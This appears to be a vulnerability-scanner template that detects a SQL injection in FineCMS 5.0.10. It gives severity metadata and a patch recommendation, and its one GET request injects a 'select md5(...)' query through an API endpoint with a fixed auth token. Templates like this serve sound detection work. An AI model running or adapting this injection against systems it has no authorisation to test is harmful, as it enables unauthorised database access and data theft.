id: finecms-sqli
info:
  name: FineCMS 5.0.10 - SQL Injection
  author: ritikchaddha
  severity: critical
  description: FineCMS 5.0.10 is vulnerable to SQL injection, allowing an attacker
    to access confidential data, modify data, and perform unauthorized administrative
    tasks on the affected site.
  reference:
  - https://blog.csdn.net/dfdhxb995397/article/details/101385340
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: finecms,sqli
  metadata:
    impact: The SQL injection vulnerability in FineCMS 5.0.10 can lead to unauthorized
      access and modification of sensitive data, as well as unauthorized administrative
      operations on affected sites.
    recommendation: Recommend updating FineCMS 5.0.10 to a patched version to prevent
      SQL injection vulnerabilities and avoid potential data breaches.
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27'
  matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
